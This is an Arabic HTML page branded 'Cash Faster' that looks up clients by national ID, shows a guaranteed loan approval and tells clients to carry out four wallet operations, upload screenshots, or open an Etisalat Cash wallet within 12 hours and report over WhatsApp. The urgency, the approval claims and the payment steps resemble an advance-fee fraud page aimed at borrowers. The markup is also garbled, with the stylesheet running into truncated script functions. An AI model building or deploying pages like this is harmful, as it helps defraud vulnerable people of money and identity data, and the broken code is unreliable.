<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>Cash Faster | خطوات التسييل ورفع التأكيدات</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --primary: #1A8C4A;
    --primary-light: #E8F5EE;
    --primary-dark: #0F6B38;
    --gold: #B8912E;
    --gold-light: #FBF6E8;
    --gold-dark: #8E6F1F;
    --bg: #F7F9FB;
    --bg-card: #FFFFFF;
    --bg-soft: #F0F4F8;
    --text: #1A2332;
    --text-muted: #6B7A8F;
    --border: #E1E8F0;
    --shadow-sm: 0 2px 8px rgba(26,35,50,0.04);
    --shadow: 0 8px 32px rgba(26,35,50,0.08);
    --shadow-lg: 0 16px 48px rgba(26,35,50,0.12);
    --success: #16A34A;
    --success-light: #DCFCE7;
    --info: #2563EB;
    --info-light: #DBEAFE;
    --warning: #D97706;
    --warning-light: #FEF3C7;
    --danger: #DC2626;
    --danger-light: #FEE2E2;
    --etisalat-blue: #0284C7;
    --etisalat-light: #E0F2FE;
    --purple: #7C3AED;
    --purple-light: #EDE9FE;
    --font: 'Cairo', sans-serif;
    --radius: 1.4rem;
    --radius-sm: 0.9rem;
  }
  body {
    font-family: var(--font);
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 1rem;
    position: relative;
    overflow-x: hidden;
    line-height: 1.7;
  }

  .watermark {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 0;
    pointer-events: none;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .watermark::before {
    content: 'CASH FASTER';
    position: absolute;
    font-size: 9rem;
    font-weight: 900;
    color: rgba(26,140,74,0.045);
    letter-spacing: 0.3rem;
    transform: rotate(-32deg);
    white-space: nowrap;
    font-family: var(--font);
  }
  .watermark::after {
    content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER';
    position: absolute;
    font-size: 1.6rem;
    font-weight: 800;
    color: rgba(184,145,46,0.04);
    letter-spacing: 0.2rem;
    transform: rotate(-32deg);
    white-space: nowrap;
    line-height: 5rem;
    width: 200%;
    text-align: center;
    font-family: var(--font);
  }

  .app-container {
    max-width: 520px;
    width: 100%;
    background: var(--bg-card);
    border-radius: 2rem;
    padding: 1.4rem 1.2rem;
    box-shadow: var(--shadow-lg);
    border: 1px solid var(--border);
    position: relative;
    z-index: 1;
    margin-bottom: 1rem;
  }

  .promo-strip {
    background: linear-gradient(135deg, var(--primary-light), var(--gold-light));
    border: 1px solid rgba(26,140,74,0.12);
    border-radius: 3rem;
    padding: 0.55rem 1.2rem;
    margin-bottom: 1.2rem;
    text-align: center;
    font-size: 0.72rem;
    color: var(--primary-dark);
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    flex-wrap: wrap;
    font-weight: 600;
  }
  .promo-strip i { color: var(--primary); }
  .promo-strip .highlight { color: var(--gold-dark); font-weight: 800; }

  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding-bottom: 1rem;
    border-bottom: 1px solid var(--border);
  }
  .brand { display: flex; align-items: center; gap: 0.7rem; cursor: pointer; }
  .brand .icon {
    width: 48px; height: 48px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    border-radius: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.5rem;
    color: #FFFFFF;
    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
  }
  .brand h1 {
    font-size: 1.4rem;
    font-weight: 900;
    color: var(--text);
    letter-spacing: 0.3px;
    line-height: 1.2;
  }
  .brand h1 span {
    color: var(--gold);
    display: block;
    font-size: 0.7rem;
    letter-spacing: 2px;
    font-weight: 700;
    margin-top: 1px;
  }
  .header .badge {
    background: var(--success-light);
    border: 1px solid rgba(22,163,74,0.2);
    border-radius: 3rem;
    padding: 0.35rem 0.9rem;
    font-size: 0.65rem;
    color: var(--success);
    display: flex;
    align-items: center;
    gap: 0.4rem;
    font-weight: 700;
  }
  .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }
  @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

  .nav-tabs {
    display: flex;
    gap: 0.4rem;
    margin: 1.1rem 0;
    background: var(--bg-soft);
    border-radius: 3rem;
    padding: 0.35rem;
  }
  .nav-tabs .tab {
    flex: 1;
    text-align: center;
    padding: 0.55rem 0.3rem;
    border-radius: 3rem;
    font-size: 0.65rem;
    font-weight: 700;
    color: var(--text-muted);
    transition: 0.25s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.35rem;
  }
  .nav-tabs .tab.active {
    background: var(--bg-card);
    color: var(--primary-dark);
    box-shadow: var(--shadow-sm);
  }

  /* ===== صندوق البحث ===== */
  .search-box {
    display: flex;
    gap: 0.6rem;
    margin: 0.9rem 0 1.3rem 0;
  }
  .search-box input {
    flex: 1;
    padding: 0.95rem 1.2rem;
    border-radius: 3rem;
    border: 2px solid var(--border);
    background: var(--bg-soft);
    color: var(--text);
    font-size: 0.95rem;
    text-align: center;
    transition: 0.25s;
    font-family: var(--font);
    font-weight: 600;
    letter-spacing: 1px;
  }
  .search-box input:focus {
    outline: none;
    border-color: var(--primary);
    background: #FFFFFF;
    box-shadow: 0 0 0 4px rgba(26,140,74,0.1);
  }
  .search-box input::placeholder {
    color: var(--text-muted);
    font-weight: 400;
    letter-spacing: 0;
  }
  .search-box button {
    padding: 0.95rem 1.6rem;
    border: none;
    border-radius: 3rem;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    color: #FFFFFF;
    font-weight: 800;
    cursor: pointer;
    transition: 0.25s;
    font-family: var(--font);
    font-size: 0.9rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
    box-shadow: 0 6px 20px rgba(26,140,74,0.25);
    white-space: nowrap;
  }
  .search-box button:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 28px rgba(26,140,74,0.35);
  }

  .loan-card {
    background: linear-gradient(145deg, #FFFFFF, #FAFCFE);
    border-radius: var(--radius);
    padding: 1.5rem 1.2rem;
    border: 1px solid var(--border);
    margin-bottom: 1rem;
    position: relative;
    overflow: hidden;
    box-shadow: var(--shadow-sm);
  }
  .loan-card::before {
    content: '';
    position: absolute;
    top: 0; right: 0;
    width: 120px; height: 120px;
    background: radial-gradient(circle, rgba(184,145,46,0.08), transparent 70%);
    pointer-events: none;
  }
  .loan-card .loan-label {
    font-size: 0.7rem;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1.5px;
    text-align: center;
    font-weight: 700;
  }
  .loan-card .loan-amount-main {
    text-align: center;
    font-size: 2.8rem;
    font-weight: 900;
    color: var(--primary-dark);
    margin: 0.3rem 0;
    letter-spacing: 1px;
    line-height: 1.1;
  }
  .loan-card .loan-amount-main .currency {
    font-size: 1.2rem;
    color: var(--text-muted);
    font-weight: 700;
  }
  .loan-card .loan-percent {
    text-align: center;
    font-size: 0.85rem;
    color: var(--success);
    font-weight: 800;
    margin-bottom: 0.8rem;
  }
  .loan-card .loan-percent i { margin-left: 0.4rem; }

  .loan-details-grid {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;
    gap: 0.6rem;
    margin-top: 1rem;
    padding-top: 1rem;
    border-top: 1px dashed var(--border);
  }
  .loan-details-grid .detail-item {
    text-align: center;
    background: var(--bg-soft);
    border-radius: var(--radius-sm);
    padding: 0.6rem 0.3rem;
    transition: 0.2s;
  }
  .loan-details-grid .detail-item:hover { background: var(--primary-light); }
  .loan-details-grid .detail-item .label {
    font-size: 0.55rem;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 0.5px;
    font-weight: 700;
  }
  .loan-details-grid .detail-item .value {
    font-size: 0.88rem;
    font-weight: 800;
    color: var(--text);
    margin-top: 0.2rem;
  }
  .loan-details-grid .detail-item .value.gold { color: var(--gold-dark); }
  .loan-details-grid .detail-item .value.green { color: var(--success); }

  .status-bar {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    background: var(--bg-card);
    border-radius: var(--radius);
    padding: 0.9rem 1.1rem;
    border: 1px solid var(--border);
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .status-bar .status-icon {
    width: 42px; height: 42px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1rem;
    flex-shrink: 0;
  }
  .status-bar .status-text { flex: 1; }
  .status-bar .status-text .main { font-weight: 800; font-size: 0.9rem; line-height: 1.3; }
  .status-bar .status-text .sub { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.15rem; }
  .status-bar.info { border-color: rgba(37,99,235,0.25); background: linear-gradient(135deg, #FFFFFF, var(--info-light)); }
  .status-bar.info .status-icon { background: var(--info-light); color: var(--info); }
  .status-bar.info .status-text .main { color: var(--info); }
  .status-bar.warning { border-color: rgba(217,119,6,0.25); background: linear-gradient(135deg, #FFFFFF, var(--warning-light)); }
  .status-bar.warning .status-icon { background: var(--warning-light); color: var(--warning); }
  .status-bar.warning .status-text .main { color: var(--warning); }

  .client-info {
    background: var(--bg-card);
    border-radius: var(--radius);
    padding: 1rem 1.2rem;
    border: 1px solid var(--border);
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .client-info .info-title {
    font-size: 0.75rem;
    font-weight: 800;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 0.6rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
  }
  .client-info .info-title i { color: var(--primary); }
  .client-info .row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.55rem 0;
    border-bottom: 1px solid var(--border);
    font-size: 0.85rem;
    gap: 0.5rem;
  }
  .client-info .row:last-child { border-bottom: none; }
  .client-info .row .key { color: var(--text-muted); font-weight: 600; flex-shrink: 0; }
  .client-info .row .value { font-weight: 700; text-align: left; color: var(--text); word-break: break-word; }
  .client-info .row .value.gold { color: var(--gold-dark); }
  .client-info .row .value.green { color: var(--success); }

  .id-verification {
    background: linear-gradient(135deg, #FFFFFF, var(--gold-light));
    border: 2px solid var(--gold);
    border-radius: var(--radius);
    padding: 1.1rem;
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .id-verification .idv-header {
    display: flex;
    align-items: center;
    gap: 0.6rem;
    margin-bottom: 0.8rem;
    padding-bottom: 0.6rem;
    border-bottom: 1px solid rgba(184,145,46,0.2);
  }
  .id-verification .idv-header .idv-icon {
    width: 38px; height: 38px;
    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #FFFFFF;
    font-size: 1rem;
    flex-shrink: 0;
  }
  .id-verification .idv-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--gold-dark); line-height: 1.3; }
  .id-verification .idv-header p { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.1rem; }
  .id-verification .idv-image-box {
    background: #FFFFFF;
    border: 1px dashed var(--gold);
    border-radius: var(--radius-sm);
    padding: 0.6rem;
    text-align: center;
    overflow: hidden;
  }
  .id-verification .idv-image-box img {
    max-width: 100%;
    height: auto;
    border-radius: 0.6rem;
    display: block;
    margin: 0 auto;
    max-height: 320px;
    object-fit: contain;
  }
  .id-verification .idv-image-box .idv-placeholder {
    padding: 1.5rem 0.5rem;
    color: var(--text-muted);
    font-size: 0.78rem;
    font-weight: 600;
  }
  .id-verification .idv-image-box .idv-placeholder i {
    font-size: 2rem;
    color: var(--gold);
    display: block;
    margin-bottom: 0.4rem;
  }
  .id-verification .idv-caption {
    font-size: 0.68rem;
    color: var(--text-muted);
    text-align: center;
    margin-top: 0.5rem;
    font-weight: 600;
  }

  .steps-container {
    background: var(--bg-card);
    border-radius: var(--radius);
    padding: 1.3rem 1.1rem;
    border: 1px solid var(--border);
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
  }
  .steps-container .steps-header {
    display: flex;
    align-items: center;
    gap: 0.7rem;
    margin-bottom: 1rem;
    padding-bottom: 0.8rem;
    border-bottom: 2px solid var(--primary-light);
  }
  .steps-container .steps-header .icon {
    width: 42px; height: 42px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #FFFFFF;
    font-size: 1.1rem;
    flex-shrink: 0;
  }
  .steps-container .steps-header h3 { font-size: 1rem; font-weight: 800; color: var(--text); line-height: 1.3; }
  .steps-container .steps-header p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.1rem; }

  .code-box {
    background: linear-gradient(135deg, var(--gold-light), #FFFDF7);
    border: 2px dashed var(--gold);
    border-radius: var(--radius-sm);
    padding: 0.9rem;
    margin: 0.8rem 0;
    text-align: center;
  }
  .code-box .code-label {
    font-size: 0.65rem;
    color: var(--gold-dark);
    font-weight: 700;
    margin-bottom: 0.35rem;
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  .code-box .code-value {
    font-size: 1.6rem;
    font-weight: 900;
    color: var(--gold-dark);
    font-family: 'Courier New', monospace;
    direction: ltr;
    letter-spacing: 2px;
  }
  .code-box .code-hint { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.3rem; }

  .step-cards { display: flex; flex-direction: column; gap: 0.7rem; margin: 0.9rem 0; }
  .step-cards .step-card {
    display: flex;
    align-items: flex-start;
    gap: 0.8rem;
    padding: 0.9rem 1rem;
    background: linear-gradient(135deg, #FFFFFF, var(--bg-soft));
    border: 1.5px solid var(--border);
    border-radius: var(--radius-sm);
    transition: 0.25s;
    position: relative;
    overflow: hidden;
  }
  .step-cards .step-card::before {
    content: '';
    position: absolute;
    top: 0; right: 0;
    width: 4px;
    height: 100%;
    background: linear-gradient(180deg, var(--primary), var(--primary-dark));
    transition: 0.25s;
  }
  .step-cards .step-card:hover {
    border-color: var(--primary);
    box-shadow: 0 4px 16px rgba(26,140,74,0.1);
    transform: translateX(-2px);
  }
  .step-cards .step-card .step-num {
    min-width: 40px;
    height: 40px;
    border-radius: 12px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    color: #FFFFFF;
    font-weight: 900;
    font-size: 1.1rem;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    box-shadow: 0 4px 12px rgba(26,140,74,0.25);
  }
  .step-cards .step-card .step-content { flex: 1; padding-top: 0.1rem; }
  .step-cards .step-card .step-content .step-title {
    font-size: 0.88rem;
    font-weight: 800;
    color: var(--text);
    margin-bottom: 0.15rem;
    line-height: 1.4;
  }
  .step-cards .step-card .step-content .step-desc {
    font-size: 0.75rem;
    color: var(--text-muted);
    line-height: 1.7;
  }
  .step-cards .step-card .step-content .step-desc strong { color: var(--primary-dark); font-weight: 800; }
  .step-cards .step-card .step-content .step-desc .gold-text { color: var(--gold-dark); font-weight: 800; }

  .amount-box {
    background: linear-gradient(135deg, var(--primary-light), #F5FBF7);
    border: 1px solid rgba(26,140,74,0.15);
    border-radius: var(--radius-sm);
    padding: 0.9rem;
    margin: 0.8rem 0;
    text-align: center;
  }
  .amount-box .amount-label { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; }
  .amount-box .amount-value { font-size: 1.5rem; font-weight: 900; color: var(--primary-dark); margin: 0.2rem 0; line-height: 1.1; }
  .amount-box .amount-sub { font-size: 0.68rem; color: var(--text-muted); }

  .open-wallet-box {
    background: linear-gradient(135deg, #FFFFFF, var(--warning-light));
    border: 2px solid var(--warning);
    border-radius: var(--radius);
    padding: 1.3rem 1.1rem;
    margin: 0.9rem 0;
    box-shadow: var(--shadow-sm);
    position: relative;
    overflow: hidden;
  }
  .open-wallet-box .ow-header {
    display: flex;
    align-items: center;
    gap: 0.7rem;
    margin-bottom: 0.9rem;
    padding-bottom: 0.8rem;
    border-bottom: 1px solid rgba(217,119,6,0.2);
  }
  .open-wallet-box .ow-header .ow-icon {
    width: 46px;
    height: 46px;
    background: linear-gradient(135deg, var(--warning), #B45309);
    border-radius: 13px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #FFFFFF;
    font-size: 1.3rem;
    flex-shrink: 0;
    box-shadow: 0 4px 12px rgba(217,119,6,0.25);
  }
  .open-wallet-box .ow-header h3 { font-size: 1rem; font-weight: 800; color: var(--warning); line-height: 1.3; }
  .open-wallet-box .ow-header p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.1rem; }

  .open-wallet-box .ow-body .greeting { font-size: 0.9rem; font-weight: 800; color: var(--text); margin-bottom: 0.5rem; }
  .open-wallet-box .ow-body .main-notice {
    background: #FFFFFF;
    border-right: 4px solid var(--warning);
    border-radius: 0.7rem;
    padding: 0.8rem 1rem;
    margin: 0.7rem 0;
    font-size: 0.85rem;
    line-height: 1.9;
    color: var(--text);
  }
  .open-wallet-box .ow-body .main-notice strong { color: var(--warning); font-weight: 800; }
  .open-wallet-box .ow-body .main-notice .danger-text { color: var(--danger); font-weight: 800; }

  .open-wallet-box .ow-steps { display: flex; flex-direction: column; gap: 0.6rem; margin: 0.8rem 0; }
  .open-wallet-box .ow-steps .ow-step {
    display: flex;
    align-items: flex-start;
    gap: 0.7rem;
    padding: 0.8rem 0.9rem;
    background: #FFFFFF;
    border: 1.5px solid rgba(217,119,6,0.15);
    border-radius: var(--radius-sm);
    font-size: 0.82rem;
    line-height: 1.7;
    color: var(--text);
  }
  .open-wallet-box .ow-steps .ow-step .ow-num {
    min-width: 32px;
    height: 32px;
    border-radius: 10px;
    background: linear-gradient(135deg, var(--warning), #B45309);
    color: #FFFFFF;
    font-weight: 800;
    font-size: 0.9rem;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .open-wallet-box .ow-steps .ow-step strong { color: var(--warning); font-weight: 800; }

  function buildLoanCard(client, totalDisplay) {

    return `
      <div class="loan-card">
        <div class="loan-label">💰 مبلغ التمويل المعتمد</div>
        <div class="loan-amount-main">${client.loan.toLocaleString('ar-EG')} <span class="currency">ج.م</span></div>
        <div class="loan-percent"><i class="fas fa-circle-check"></i> ✅ تمت الموافقة النهائية 100%</div>
        <div class="loan-details-grid">
          <div class="detail-item"><div class="label">💰 المبلغ</div><div class="value gold">${client.loan.toLocaleString('ar-EG')} ج.م</div></div>
          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm}</div></div>
          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment} ج.م</div></div>

  function buildSteps(client) {

          <div class="step-card">
            <div class="step-num">4</div>
            <div class="step-content">
              <div class="step-title">📤 ارفع الصور</div>
              <div class="step-desc">اضغط على زر <span class="gold-text">"ارفع لقطات التسييل"</span> بالأسفل</div>
            </div>
          </div>
        </div>

        <div class="amount-box">
          <div class="amount-label">💰 المبلغ المؤكد لكل عملية</div>
          <div class="amount-value">${perOpFormatted} ج.م</div>
          <div class="amount-sub">💳 إجمالي 4 عمليات = ${totalFormatted} ج.م</div>
        </div>

        <button class="btn-upload" onclick="window.open('${SURVEY_URL}','_blank')">
          <i class="fas fa-cloud-arrow-up"></i> 📤 ارفع لقطات التسييل الآن
        </button>

        <button class="btn-whatsapp" onclick="openWhatsApp()">
          <i class="fab fa-whatsapp fa-lg"></i> 💬 تواصل مع قسم التحويلات المالية
        </button>
      </div>
    `;
  }

  function buildOpenWalletBox(client) {
    return `
      <div class="open-wallet-box">
        <div class="ow-header">
          <div class="ow-icon"><i class="fas fa-triangle-exclamation"></i></div>
          <div>
            <h3>⚠️ مطلوب فتح محفظة اتصالات كاش</h3>
            <p>💡 لإتمام إجراءات الصرف</p>
          </div>
        </div>

        <div class="ow-body">
          <div class="greeting">💚 عزيزي ${client.name}،</div>

          <div class="main-notice">
            <span class="danger-text">⚠️ نظامنا حاليًا يخدم محفظة اتصالات كاش فقط.</span><br><br>
            📌 لكي نتمكن من البدء في إنهاء إجراءات التسيل والصرف لحسابك، يجب عليك:<br><br>
            <strong>📱 فتح محفظة اتصالات كاش مسجلة باسمك</strong> خلال مدة لا تتجاوز <strong>⏰ 12 ساعة</strong> من الآن.<br><br>
            📞 وبعد فتح المحفظة، قم بإبلاغ قسم التحويلات المالية على واتساب برقم اتصالات الخاص بك ليتم إضافته إلى ملفك الشخصي على السيستم.
          </div>

          <div class="ow-timer-note">
            <i class="fas fa-hourglass-half"></i>
            <span>⏰ المدة المتبقية: 12 ساعة من الآن</span>
          </div>

          <div class="ow-steps">
            <div class="ow-step">
              <div class="ow-num">1</div>
              <div>📱 توجه إلى أقرب فرع اتصالات أو استخدم تطبيق <strong>My Etisalat</strong> لفتح محفظة كاش.</div>
            </div>
            <div class="ow-step">
              <div class="ow-num">2</div>
              <div>✅ تأكد أن المحفظة <strong>مسجلة باسمك</strong> وبنفس الرقم القومي المسجل لدينا.</div>
            </div>
            <div class="ow-step">
              <div class="ow-num">3</div>
              <div>📞 بعد فتح المحفظة، أرسل رقم اتصالات الخاص بك عبر واتساب إلى <strong>قسم التحويلات المالية</strong>.</div>
            </div>
            <div class="ow-step">
              <div class="ow-num">4</div>
              <div>🎯 سيتم إضافة الرقم إلى ملفك على السيستم، ثم نبدأ فورًا في <strong>إنهاء إجراءات التسيل والصرف</strong> لك.</div>
            </div>
          </div>

          <div class="ow-apology">
            😔 <i class="fas fa-circle-info"></i>
            نأسف، نظامنا حاليًا يخدم محفظة اتصالات كاش فقط. وقد تم إبلاغك بذلك في وقت التسجيل.
          </div>

          <button class="btn-whatsapp" onclick="openWhatsApp('السلام عليكم 👋\\n\\n👤 أنا: ${client.name}\\n🔢 الرقم القومي: ${client.id}\\n\\n📱 لقد قمت بفتح محفظة اتصالات كاش جديدة كما طُلب مني.\\n🔢 رقم اتصالات الجديد: [اكتب رقمك هنا]\\n\\n🎯 أرغب في إبلاغ قسم التحويلات المالية برقم اتصالات الخاص بي ليتم إضافته إلى ملفي على السيستم والبدء في إنهاء إجراءات التسيل والصرف.\\n\\n🙏 شكرًا.')">
            <i class="fab fa-whatsapp fa-lg"></i> 📞 إبلاغ قسم التحويلات المالية برقم اتصالات
          </button>
        </div>
      </div>
    `;
  }

  function buildTransparency() {
    return `
      <div class="transparency-box">
        <div class="trans-header">
          <i class="fas fa-shield-halved"></i>
          <h4>🛡️ حقوقك وضماناتك</h4>
        </div>
        <ul>
          <li><i class="fas fa-check"></i> <span>💰 لا نطلب أي رسوم مسبقة مقابل الصرف.</span></li>
          <li><i class="fas fa-check"></i> <span>🔑 كود التفعيل خاص بحسابك أنت فقط، ولا يُستخدم لأي غرض آخر.</span></li>
          <li><i class="fas fa-check"></i> <span>✅ يمكنك التأكد من الكود عبر تطبيق اتصالات الرسمي قبل التنفيذ.</span></li>
          <li><i class="fas fa-check"></i> <span>💬 لأي استفسار، تواصل معنا مباشرة عبر واتساب الرسمي.</span></li>
        </ul>
      </div>
    `;
  }

  function displayResult(client) {
    currentClient = client;
    const resultArea = document.getElementById('resultArea');
    const totalDisplay = calculateTotal(client);

    let html = '';
    html += buildLoanCard(client, totalDisplay);
    html += buildIdVerification(client);
    html += buildClientDetails(client);

    if (client.hasEtisalat === true) {
      html += `
        <div class="status-bar info">
          <div class="status-icon"><i class="fas fa-circle-info"></i></div>
          <div class="status-text">
            <div class="main">✅ طلبك جاهز للتسييل</div>
            <div class="sub">💡 اتبع خطوات التسييل أدناه لإتمام الصرف</div>
          </div>
        </div>
      `;
      html += buildSteps(client);
    } else {
      html += `
        <div class="status-bar warning">
          <div class="status-icon"><i class="fas fa-triangle-exclamation"></i></div>
          <div class="status-text">
            <div class="main">⚠️ مطلوب فتح محفظة اتصالات كاش</div>
            <div class="sub">⏰ خلال 12 ساعة من الآن لإتمام الصرف</div>
          </div>
        </div>
      `;
      html += buildOpenWalletBox(client);
    }

    html += buildTransparency();

    resultArea.innerHTML = html;
    document.getElementById('errorBox').style.display = 'none';
  }

  // ===== البحث =====
  function searchCustomer(idFromURL) {
    const input = document.getElementById('nationalId');
    const nationalId = idFromURL || (input ? input.value.trim() : '');

    if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
    if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }

    document.getElementById('loader').style.display = 'block';
    document.getElementById('resultArea').innerHTML = '';
    document.getElementById('errorBox').style.display = 'none';

    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      const found = customersDatabase[nationalId];
      if (found) {
        found.id = nationalId;
        displayResult(found);
      } else {
        document.getElementById('errorBox').style.display = 'block';
        currentClient = null;
      }
    }, 700);
  }

  // ===== قراءة الرقم من الرابط عند فتح الصفحة (اختياري) =====
  window.addEventListener('load', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const idFromURL = urlParams.get('id');
    if (idFromURL && idFromURL.length === 14) {
      const input = document.getElementById('nationalId');
      if (input) input.value = idFromURL;
      searchCustomer(idFromURL);
    }
  });

  // ===== الأحداث =====
  document.getElementById('nationalId')?.addEventListener('keypress', e => {
    if (e.key === 'Enter') searchCustomer();
  });

  window.searchCustomer = searchCustomer;
  window.openWhatsApp = openWhatsApp;
</script>

</body>
</html>
